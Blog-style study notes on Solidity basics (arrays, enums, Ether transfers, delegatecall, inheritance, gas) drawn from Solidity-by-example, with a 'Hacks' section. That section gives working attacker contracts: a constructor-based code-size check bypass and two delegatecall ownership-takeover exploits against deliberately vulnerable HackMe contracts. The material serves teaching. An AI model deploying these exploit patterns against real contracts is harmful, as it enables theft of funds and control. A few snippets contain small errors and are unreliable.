---
toc: true
layout: post
description: Short notes (reminder hooks) about extreme basics of Solidity from Solidity-by-example
categories: [web3, solidity, solidity-by-example, language-tricks, beginner]
title: Solidity-By-Example
---

## General

1. Solidity supports if, else and else if statements.

2. Ternary operators are also supported.

3. `for`, `while` and `do while` loops are supported. But anything apart from `for` is rarely used.

4.Arrays

```solidity
uint[] public arr = [1,2,3];
uint[] public arr;
uint[10] public fixedSizeArr;
// Solidity can also return entire arrays
returns(uint[] memory)

// Creating an array in memory. Only fixed sized arrays can be created

function createArray() public {
    uint[] memory arr = new uint[](5);
}

// Deleting an array element can be done in two ways:
// 1. Maintain array order: Shift all elements post deleted element one place left and pop last element
// 2. Do not maintain array order: Copy last element to the deleted index. Pop the last element.
```

5. Enums

```solidity

enum Status {
    Pending,
    Accepted,
    EnRoute,
    Delievered,
    Cancelled,
    Refunded
}

Status public status; // Default status is 0, ie, Pending 

status = Status.Cancelled; // Setting the status to Cancelled

delete status; // Resets the status to 0, ie, Pending

// A good practice would be to declare all the enums in your project inside a single file and then import that file
// in different files where the enums are to be used.
```

6. A maximum of three parameters can be indexed in an event. Indexing helps to sort the given parameter while filtering the logs.

7. To call the parent contracts, either do `parentContract.foo()` or use the `super` keyword.

Using `super` would call all of the immediate parent contracts.

8. Interfaces have no state variables, no constructors and no function implementations

All functions have to be external and interfaces can inherit.

You can name your function parameters. Like `address owner` instead of `address`.

9. The recommended method for sending Ether is `call` in combination with `re-entrancy guard`.

```solidity
    /*
    Which function is called, fallback() or receive()?

           send Ether
               |
         msg.data is empty?
              / \
            yes  no
            /     \
receive() exists?  fallback()
         /   \
        yes   no
        /      \
    receive()   fallback()
    */

_to.transfer(msg.value);

bool sent = _to.send(msg.value);

(bool sent, bytes memory data) = _to.call{value: msg.value}("");

```

Also, fallback function cannot take any arguments and cannot return anything.

10. `fallback` is called when a function that does not exist is called or some Ether is sent without msg.data or recieve function does not exist.

11. Calling other functions with the low-level `call`

```
(bool success, bytes memory data) = _addr.call{value: msg.value, gas: 5000}(abi.encodeWithSignature("foo(string,uint256)", "call foo", 123));
```

12. `delegatecall` is similar to `call` but the difference is if contract A delegates a call to contract B, then the function code of contract B is executed with the storage, msg.sender and msg.value of contract A itself.

13.

```

function transfer(address _addr, uint256 _amt) {
    // something
}

```

```

abi.encodeWithSignature("transfer(address,uint256)");

```

and 

```

bytes4 public transferSelector = bytes4(keccak256(bytes4("transfer(address,uint256)")));

```

Same energy


14. 

## Constant vs Immutable

Both immutable and constant are keywords that can be used on state variables to restrict modifications to their state. The difference is that constant variables can never be changed after compilation, while immutable variables can be set within the constructor.

```solidity

pragma solidity >0.6.4 <0.7.0;

contract C {
    uint constant X = 32**22 + 8;
    string constant TEXT = "abc";
    bytes32 constant MY_HASH = keccak256("abc");
    uint immutable decimals;
    uint immutable maxBalance;
    address immutable owner = msg.sender;

    constructor(uint _decimals, address _reference) public {
        decimals = _decimals;
        // Assignments to immutables can even access the environment.
        maxBalance = _reference.balance;
    }

    function isBalanceTooHigh(address _other) public view returns (bool) {
        return _other.balance > maxBalance;
    }
}

```

Compared to regular state variables, the gas costs of constant & immutable variables are much lower.

a) For a constant variable, the expression assigned to it is copied to all the places where it is accessed and also re-evaluated each time. This allows for local optimizations.

> Reevaluated each time means:
If you have something like, uint area = 2 * PI * 5; 
This will get reevaluated to the exact value at time of pasting the value of PI here.

b) Immutable variables are evaluated once at construction time and their value is copied to all the places in the code where they are accessed. For these values, 32 bytes are reserved.

-> Due to this, constant values can sometimes be cheaper than immutable values.

## Inheritence

0. Function that is going to be overriden, must be declared as `virtual` and the function that will override a parent function must use the keyword `override`

1. The order of inheritence in a new contract should go from *most-base-like* to *most-derived*.

2. Contracts can inherit from multiple parent contracts. When a function is called that is defined multiple times in different contracts, parent contracts are searched from right to left, and in depth-first manner.

## Shadowing Inherited State Variables

```solidity

contract Parent {
    uint256 public pi = 314;
}

contract Child is Parent {

    // uint256 public pi = 31419; // Would fail
    // pi = 314159; // Would also fail

    constructor() {
        pi = 314159;
    }
}


```

## Wei and Ethere

Just as `1 ether == 1e18`, `1 wei == 1`

## Gas

Price paid in Ether = Gas Price * Gas spent

*Gas Price* is the amount of Ether you are willing to pay per gas. Usually denoted in gwei, which is equal to 1e9.

*Gas Spent* is the total number of gas spent while doing all the operations required in a particular txn.

Unused gas is refunded.

Two caps of gas:
1. Block gas limit
2. gas limit (that is set by you, ie the maximum gas you are willing to pay for a particular transaction)

# Hacks

## Bypass contracrt code size check

If a contract implements a function to check the code-size of a particular address, it will write a function similar to this:

```solidity
function isContract(address addr) public returns(bool) {
    uint32 codeSize;
    assembly {
        codeSize := extcodesize(addr)
    }
    return codeSize > 0;
}
```

But if this function is called by a contract from its constructor, we can bypass this check. Consider this example:

```solidity

contract Attacker {
    bool public isContract;

    constructor(address _target) {
        isContract = Target(_target).isContract(address(this));
        require(!isContract);
    }
}

```

## Signature Replay Attack

Signing messages off chain and then having a contract that requires that signature before executing a function is a useful technique.

Vulnerability is that the same signature can be used again and again to execute a function.

The ECDSA or the Elliptic Curve Digital Signature Algorithm signatures can be recovered or managed using the ECDSA utility of OZ.
These are often generated using the `web3.eth.sign` function and are 65 byte array (of type bytes in Solidity) arranged in the following way:
[[v(1)],[r(32)],[s(32)]]
The data signer can be recovered with ECDSA.

The following code snippet shows how to prevent the signature replay attack:

```solidity

//SPDX-License-Identifier: MIT
pragma solidity 0.8.14;

import "github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v4.5/contracts/utils/cryptography/ECDSA.sol";

contract ReplayAttack {
    using ECDSA for bytes32;

    address[2] public owners;
    mapping(bytes32 => bool) public executed;

    constructor(address[2] memory _owners) payable {
        owners = _owners;
    }

    function deposit() external payable {}

    function transfer(address _to, uint256 _amount, uint256 _nonce, bytes[2] memory _sigs) external {
        bytes32 txHash = getTxHash(_to, _amount, _nonce);
        require(!executed[txHash], "Already Executed");
        require(_checkSigs(_sigs, txHash), "invalid sigs");

        executed[txHash] = true;

        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }

    function getTxHash(address _to, uint256 _amount, uint256 _nonce) public view returns(bytes32) {
        return (keccak256(abi.encodePacked(address(this), _to, _amount, _nonce)));
    }

    function _checkSigs(bytes[2] memory _sigs, bytes32 _txHash) private view returns(bool) {
        bytes32 ethSignedHash = _txHash.toEthSignedMessageHash();

        for(uint i = 0; i < _sigs.length; i++) {
            address signer = ethSignedHash.recover(_sigs[i]);
            bool valid = signer == owners[i];

            if(!valid) {
                return false;
            }
        }

        return true;
    }
}

```

## block.timestamp manipulation

Don't use block.timestamp as a source of entropy and/or random number.

The miners can manipulate the block.timestamp with the following two constraints:

1. Block cannot be stamped with a time earlier than it's parent
2. Cannot be too far out in the future.

## Front Running

Transactions take some time before they are mined.

Transactions not yet mined are put in a transaction pool.

Since transactions with a higher gas price are typically mined first, an attacker who might be watching the mempool, may spot an opportunity to get their own txn included in a block before someone else (might be winning a game, swapping a highly illiquid asset etc) and get significant economical incentives.

Solution:

1. Use the commit-reveal-distribute scheme when games are involved.
2. Use submarine send.

## Hiding malicious code with external contracts

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

contract A {
    uint256 public testVar; // public will create an automatic getter function
}

contract B {
    uint256 public testVar = 10; 
}

contract ProblematicTypecasting {
    function viewTestVar(address _addr) public view returns(uint256) {
        A(_addr).testVar();
        // Will return 0 or 10 based on whether we pass the deployed address of contract A or B.
    }
}

```

## Phishing with txn.origin

Use msg.sender

## delegatecalls

delegatecalls preserves context

example:

```solidity
What happened?
Eve called Attack.attack().
Attack called the fallback function of HackMe sending the function
selector of pwn(). HackMe forwards the call to Lib using delegatecall.
Here msg.data contains the function selector of pwn().
This tells Solidity to call the function pwn() inside Lib.
The function pwn() updates the owner to msg.sender.
Delegatecall runs the code of Lib using the context of HackMe.
Therefore HackMe's storage was updated to msg.sender where msg.sender is the
caller of HackMe, in this case Attack.
*/

contract Lib {
    address public owner;

    function pwn() public {
        owner = msg.sender;
    }
}

contract HackMe {
    address public owner;
    Lib public lib;

    constructor(Lib _lib) {
        owner = msg.sender;
        lib = Lib(_lib);
    }

    fallback() external payable {
        address(lib).delegatecall(msg.data);
    }
}

contract Attack {
    address public hackMe;

    constructor(address _hackMe) {
        hackMe = _hackMe;
    }

    function attack() public {
        hackMe.call(abi.encodeWithSignature("pwn()"));
    }
}

```

Another slightly more sophisticated example

```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

/*
This is a more sophisticated version of the previous exploit.

1. Alice deploys Lib and HackMe with the address of Lib
2. Eve deploys Attack with the address of HackMe
3. Eve calls Attack.attack()
4. Attack is now the owner of HackMe

What happened?
Notice that the state variables are not defined in the same manner in Lib
and HackMe. This means that calling Lib.doSomething() will change the first
state variable inside HackMe, which happens to be the address of lib.

Inside attack(), the first call to doSomething() changes the address of lib
store in HackMe. Address of lib is now set to Attack.
The second call to doSomething() calls Attack.doSomething() and here we
change the owner.
*/

contract Lib {
    uint public someNumber;

    function doSomething(uint _num) public {
        someNumber = _num;
    }
}

contract HackMe {
    address public lib;
    address public owner;
    uint public someNumber;

    constructor(address _lib) {
        lib = _lib;
        owner = msg.sender;
    }

    function doSomething(uint _num) public {
        lib.delegatecall(abi.encodeWithSignature("doSomething(uint256)", _num));
    }
}

contract Attack {
    // Make sure the storage layout is the same as HackMe
    // This will allow us to correctly update the state variables
    address public lib;
    address public owner;
    uint public someNumber;

    HackMe public hackMe;

    constructor(HackMe _hackMe) {
        hackMe = HackMe(_hackMe);
    }

    function attack() public {
        // override address of lib
        hackMe.doSomething(uint(uint160(address(this))));
        // pass any number as input, the function doSomething() below will
        // be called
        hackMe.doSomething(1);
    }

    // function signature must match HackMe.doSomething()
    function doSomething(uint _num) public {
        owner = msg.sender;
    }
}


```